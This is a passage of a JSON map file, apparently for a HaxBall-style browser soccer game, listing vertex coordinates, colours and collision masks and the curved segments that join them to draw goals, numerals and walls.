			"color": "FFFFFF"
		},
		{
			"x": -157,
			"y": 59,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -157,
			"y": 75,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -168,
			"y": 75,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -159.33332824706997,
			"y": 67,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -166,
			"y": 67,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -110,
			"y": -5,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -124,
			"y": -5,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -124,
			"y": 11,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -111,
			"y": 11,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -111,
			"y": 3,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -124,
			"y": 3,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -151,
			"y": -162,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -141,
			"y": -162,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -141,
			"y": -154,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -151,
			"y": -154,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -141,
			"y": -146,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -151,
			"y": -146,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -142,
			"y": -174,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -150,
			"y": -174,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -100.45539031039415,
			"y": -71.14763245610283,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -102.20320690343037,
			"y": -106.10396431682739,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -100.33054626803442,
			"y": -68.65075160890822,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -102.32805094579011,
			"y": -108.600845164022,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -100.58023435275389,
			"y": -73.64451330329744,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FF6054"
		},
		{
			"x": -102.07836286107064,
			"y": -103.60708346963278,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FF6054"
		},
		{
			"x": -144.33332824706997,
			"y": 149,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -144.33332824706997,
			"y": 165,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -109,
			"y": -97,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -109,
			"y": -79,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -103.18182373047,
			"y": -96,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -103.18182373047,
			"y": -80,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -93,
			"y": -80,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -93,
			"y": -96,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -192,
			"y": -72,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -180,
			"y": -72,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -180,
			"y": -56,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -192,
			"y": -56,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -189.5,
			"y": -64,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -182.5,
			"y": -64,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": -122.1194668480596,
			"y": -16.65733382776977,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -114.12127214605502,
			"y": -16.827279433260127,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -141.78986492508358,
			"y": 70.44474840932315,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -141.83376861516393,
			"y": 62.44486888110541,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -96.33553691252304,
			"y": -68.8505020766838,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -104.3255556235458,
			"y": -68.45100114113266,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -185.45539031039414,
			"y": -46.147632456102826,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -187.20320690343038,
			"y": -81.10396431682739,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -185.33054626803442,
			"y": -43.65075160890822,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -187.3280509457901,
			"y": -83.600845164022,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -185.5802343527539,
			"y": -48.644513303297444,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FF6054"
		},
		{
			"x": -187.07836286107064,
			"y": -78.60708346963278,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FFFFFF"
		},
		{
			"x": -181.33553691252303,
			"y": -43.850502076683796,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -189.3255556235458,
			"y": -43.451001141132664,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -143.45539031039414,
			"y": 173.7614556786628,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -145.20320690343038,
			"y": 138.80512381793824,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -143.33054626803442,
			"y": 176.2583365258574,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -145.3280509457901,
			"y": 136.3082429707436,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -143.5802343527539,
			"y": 171.26457483146817,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FF6054"
		},
		{
			"x": -145.07836286107064,
			"y": 141.30200466513284,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FF6054"
		},
		{
			"x": -139.33553691252303,
			"y": 176.05858605808183,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -147.3255556235458,
			"y": 176.45808699363295,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 145.6882208773082,
			"y": 66.4585285483644,
			"cMask": [],
			"color": "0648CC"
		},
		{
			"x": 110.68874794135559,
			"y": 66.65060719246607,
			"cMask": [],
			"color": "0648CC"
		},
		{
			"x": 148.18818322987624,
			"y": 66.44480864521428,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 108.18878558878754,
			"y": 66.66432709561619,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 143.18825852474015,
			"y": 66.47224845151452,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 113.18871029392363,
			"y": 66.63688728931595,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 171.9327385046584,
			"y": -14.242870786138518,
			"cMask": [],
			"color": "0648CC"
		},
		{
			"x": 172.67625052867876,
			"y": 20.749231035131636,
			"cMask": [],
			"color": "0648CC"
		},
		{
			"x": 171.87963050294266,
			"y": -16.74230663051495,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 172.7293585303945,
			"y": 23.248666879508086,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 171.98584650637417,
			"y": -11.743434941762064,
			"bCoef": -3,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 172.62314252696302,
			"y": 18.249795190755194,
			"bCoef": -1,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 144,
			"y": -171.5,
			"cMask": [],
			"color": "333333"
		},
		{
			"x": 144,
			"y": -136.5,
			"cMask": [],
			"color": "0648CC"
		},
		{
			"x": 144,
			"y": -174,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 144,
			"y": -134,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 144,
			"y": -169,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 144,
			"y": -139,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 122,
			"y": 59,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 133,
			"y": 59,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 133,
			"y": 75,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 122,
			"y": 75,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 130.66667175293003,
			"y": 67,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 124,
			"y": 67,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 180,
			"y": -5,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 166,
			"y": -5,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 166,
			"y": 11,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 179,
			"y": 11,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 179,
			"y": 3,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 166,
			"y": 3,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 139,
			"y": -162,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 149,
			"y": -162,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 149,
			"y": -154,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 139,
			"y": -154,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 149,
			"y": -146,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 139,
			"y": -146,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 148,
			"y": -174,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 140,
			"y": -174,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 189.54460968960586,
			"y": -71.14763245610283,
			"cMask": [],
			"color": "0648CC"
		},
		{
			"x": 187.79679309656962,
			"y": -106.10396431682739,
			"cMask": [],
			"color": "0648CC"
		},
		{
			"x": 189.66945373196558,
			"y": -68.65075160890822,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 187.6719490542099,
			"y": -108.600845164022,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 189.4197656472461,
			"y": -73.64451330329744,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 187.92163713892936,
			"y": -103.60708346963278,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 145.66667175293003,
			"y": 149,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 145.66667175293003,
			"y": 165,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 181,
			"y": -97,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 181,
			"y": -79,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 186.81817626953,
			"y": -96,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 186.81817626953,
			"y": -80,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 197,
			"y": -80,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 197,
			"y": -96,
			"cMask": [],
			"color": "FFFFFF"
		},
		{
			"x": 98,
			"y": -72,
			"cMask": [],
			"color": "C7E6BD"
		},
		{
			"x": 110,
			"y": -72,
			"cMask": [],
			"color": "C7E6BD"
		},
		{
			"x": 110,
			"y": -56,
			"cMask": [],
			"color": "C7E6BD"
		},
		{
			"x": 98,
			"y": -56,
			"cMask": [],
			"color": "C7E6BD"
		},
		{
			"x": 100.5,
			"y": -64,
			"cMask": [],
			"color": "C7E6BD"
		},
		{
			"x": 107.5,
			"y": -64,
			"cMask": [],
			"color": "C7E6BD"
		},
		{
			"x": 167.8805331519404,
			"y": -16.65733382776977,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 175.87872785394498,
			"y": -16.827279433260127,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 148.21013507491642,
			"y": 70.44474840932315,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 148.16623138483607,
			"y": 62.44486888110541,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 193.66446308747697,
			"y": -68.8505020766838,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 185.6744443764542,
			"y": -68.45100114113266,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 104.54460968960586,
			"y": -46.147632456102826,
			"cMask": [],
			"color": "0648CC"
		},
		{
			"x": 102.79679309656962,
			"y": -81.10396431682739,
			"cMask": [],
			"color": "0648CC"
		},
		{
			"x": 104.66945373196558,
			"y": -43.65075160890822,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 102.6719490542099,
			"y": -83.600845164022,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 104.4197656472461,
			"y": -48.644513303297444,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 102.92163713892936,
			"y": -78.60708346963278,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 108.66446308747697,
			"y": -43.850502076683796,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 100.6744443764542,
			"y": -43.451001141132664,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 146.54460968960586,
			"y": 173.7614556786628,
			"cMask": [],
			"color": "0648CC"
		},
		{
			"x": 144.79679309656962,
			"y": 138.80512381793824,
			"cMask": [],
			"color": "0648CC"
		},
		{
			"x": 146.66945373196558,
			"y": 176.2583365258574,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 144.6719490542099,
			"y": 136.3082429707436,
			"bCoef": -0.5,
			"color": "08E6FF"
		},
		{
			"x": 146.4197656472461,
			"y": 171.26457483146817,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 144.92163713892936,
			"y": 141.30200466513284,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "004077"
		},
		{
			"x": 150.66446308747697,
			"y": 176.05858605808183,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": 142.6744443764542,
			"y": 176.45808699363295,
			"bCoef": -30,
			"color": "333333"
		},
		{
			"x": -190,
			"y": 179,
			"trait": "none",
			"color": "C7E6BD",
			"curve": 0
		},
		{
			"x": -100,
			"y": 179,
			"trait": "none",
			"color": "C7E6BD",
			"curve": 0
		},
		{
			"x": 99,
			"y": 179,
			"trait": "none",
			"color": "C7E6BD"
		},
		{
			"x": 189,
			"y": 179,
			"trait": "none",
			"color": "C7E6BD"
		},
		{
			"x": 98,
			"y": -181,
			"trait": "none",
			"color": "C7E6BD"
		},
		{
			"x": 188,
			"y": -181,
			"trait": "none",
			"color": "C7E6BD"
		},
		{
			"x": -190,
			"y": -181,
			"trait": "none",
			"color": "C7E6BD"
		},
		{
			"x": -100,
			"y": -181,
			"trait": "none",
			"color": "C7E6BD"
		},
		{
			"x": -190,
			"y": -211,
			"trait": "none"
		},
		{
			"x": -100,
			"y": -211,
			"trait": "none"
		},
		{
			"x": 98,
			"y": -211,
			"trait": "none"
		},
		{
			"x": 188,
			"y": -211,
			"trait": "none"
		},
		{
			"x": 99,
			"y": 209,
			"trait": "none"
		},
		{
			"x": 189,
			"y": 209,
			"trait": "none"
		},
		{
			"x": -100,
			"y": 209,
			"trait": "none"
		},
		{
			"x": -190,
			"y": 209,
			"trait": "none"
		},
		{
			"x": -190,
			"y": 179,
			"trait": "none"
		},
		{
			"x": -281,
			"y": -182,
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"color": "FF6054"
		},
		{
			"x": -281,
			"y": 178,
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"color": "FF6054"
		},
		{
			"x": 277,
			"y": -181,
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"color": "08E6FF"
		},
		{
			"x": 278,
			"y": 180,
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"color": "08E6FF"
		},
		{
			"x": -281.6776750621829,
			"y": 178.2460341165712,
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"color": "08E6FF"
		},
		{
			"x": 277.32338976468,
			"y": 178.73345881060513,
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"color": "08E6FF"
		},
		{
			"x": -280.6776750621829,
			"y": -180.7539658834288,
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"color": "FF6054"
		},
		{
			"x": 278.32338976468,
			"y": -182.26654118939487,
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"color": "FF6054"
		},
		{
			"x": -35.919668732336966,
			"y": 25.206785075324188,
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		},
		{
			"x": -20.795597687142454,
			"y": -30.248142090389024,
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		},
		{
			"x": -6.301696268831047,
			"y": 27.727463582856604,
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		},
		{
			"x": -32.13865097103834,
			"y": -1.8905088806493136,
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		},
		{
			"x": 38.44034723986938,
			"y": -4.411187388181732,
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		},
		{
			"x": 2.3339615810485355,
			"y": 29.75801015836883,
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		},
		{
			"x": 1.1203015589032994,
			"y": -28.89444437338087,
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		},
		{
			"x": 40.21415804146627,
			"y": -28.89444437338087,
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		}
	],
	"segments": [
		{
			"v0": 0,
			"v1": 1,
			"vis": false,
			"color": "33BF00",
			"cMask": [
				"red",
				"blue"
			],
			"cGroup": [
				"red",
				"blue"
			]
		},
		{
			"v0": 2,
			"v1": 3,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 3,
			"v1": 2,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 4,
			"v1": 5,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 5,
			"v1": 4,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 6,
			"v1": 7,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 7,
			"v1": 6,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 8,
			"v1": 9,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 9,
			"v1": 8,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 10,
			"v1": 11,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 11,
			"v1": 10,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 12,
			"v1": 13,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -1,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 13,
			"v1": 12,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -1,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 14,
			"v1": 15,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 15,
			"v1": 14,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 16,
			"v1": 17,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 17,
			"v1": 16,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 18,
			"v1": 19,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 19,
			"v1": 18,
			"curve": 180,
			"color": "FF6054",
			"bCoef": 0,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 20,
			"v1": 21,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 21,
			"v1": 22,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 22,
			"v1": 23,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 24,
			"v1": 25,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 26,
			"v1": 27,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 27,
			"v1": 28,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 28,
			"v1": 29,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 29,
			"v1": 30,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 30,
			"v1": 31,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 32,
			"v1": 33,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 33,
			"v1": 34,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 34,
			"v1": 35,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 35,
			"v1": 32,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 34,
			"v1": 36,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 36,
			"v1": 37,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 39,
			"v1": 38,
			"curve": 14.999999999999998,
			"color": "333333",
			"bCoef": -30,
			"curveF": 7.595754112725151
		},
		{
			"v0": 40,
			"v1": 41,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 41,
			"v1": 40,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 42,
			"v1": 43,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 43,
			"v1": 42,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 44,
			"v1": 45,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 45,
			"v1": 44,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 46,
			"v1": 47,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 48,
			"v1": 49,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 50,
			"v1": 51,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 51,
			"v1": 52,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 52,
			"v1": 53,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 53,
			"v1": 50,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 54,
			"v1": 55,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 55,
			"v1": 56,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 56,
			"v1": 57,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 57,
			"v1": 54,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 58,
			"v1": 59,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 60,
			"v1": 61,
			"color": "333333",
			"bCoef": -30
		},
		{
			"v0": 63,
			"v1": 62,
			"curve": 29.999999999999996,
			"color": "333333",
			"bCoef": -30,
			"curveF": 3.7320508075688776
		},
		{
			"v0": 64,
			"v1": 65,
			"curve": 14.999999999999998,
			"color": "333333",
			"bCoef": -30,
			"curveF": 7.595754112725151
		},
		{
			"v0": 66,
			"v1": 67,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 67,
			"v1": 66,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 68,
			"v1": 69,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 69,
			"v1": 68,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 70,
			"v1": 71,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 71,
			"v1": 70,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 72,
			"v1": 73,
			"curve": 14.999999999999998,
			"color": "333333",
			"bCoef": -30,
			"curveF": 7.595754112725151
		},
		{
			"v0": 74,
			"v1": 75,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 75,
			"v1": 74,
			"curve": 180,
			"color": "D40000",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 76,
			"v1": 77,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 77,
			"v1": 76,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 78,
			"v1": 79,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 79,
			"v1": 78,
			"curve": 180,
			"color": "FF6054",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 80,
			"v1": 81,
			"curve": 14.999999999999998,
			"color": "333333",
			"bCoef": -30,
			"curveF": 7.595754112725151
		},
		{
			"v0": 82,
			"v1": 83,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 83,
			"v1": 82,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 84,
			"v1": 85,
			"curve": 180,
			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 85,
			"v1": 84,
			"curve": 180,
			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 86,
			"v1": 87,
			"curve": 180,
			"color": "004077",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 87,
			"v1": 86,
			"curve": 180,
			"color": "004077",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 88,
			"v1": 89,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 89,
			"v1": 88,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 90,
			"v1": 91,
			"curve": 180,
			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 91,
			"v1": 90,
			"curve": 180,
			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 92,
			"v1": 93,
			"curve": 180,
			"color": "004077",
			"bCoef": -1,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 93,
			"v1": 92,
			"curve": 180,
			"color": "004077",
			"bCoef": -1,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 94,
			"v1": 95,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 95,
			"v1": 94,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 96,
			"v1": 97,
			"curve": 180,
